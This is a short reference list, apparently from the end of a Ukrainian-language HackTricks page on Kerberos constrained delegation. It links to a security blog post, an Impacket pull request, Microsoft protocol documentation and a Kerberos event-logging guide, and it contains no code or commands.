- [19] [Sprocket Security — зловживання делегуванням з обмеженнями без переходу протоколу для облікових записів без SPN](https://www.sprocketsecurity.com/blog/abusing-constrained-delegation-without-protocol-transition-against-spn-less-accounts)
- [20] [Запит на злиття Impacket № 2324 — S4U2Proxy з U2U](https://github.com/fortra/impacket/pull/2324)
- [21] [Microsoft MS-SFU — використання ServicesAllowedToSendForwardedTicketsTo](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/6d76bf10-3c48-4e14-9992-df1bd456455e)
- [22] [Microsoft Learn — увімкнення журналювання подій Kerberos](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/enable-kerberos-event-logging)
{{#include ../../banners/hacktricks-training.md}}
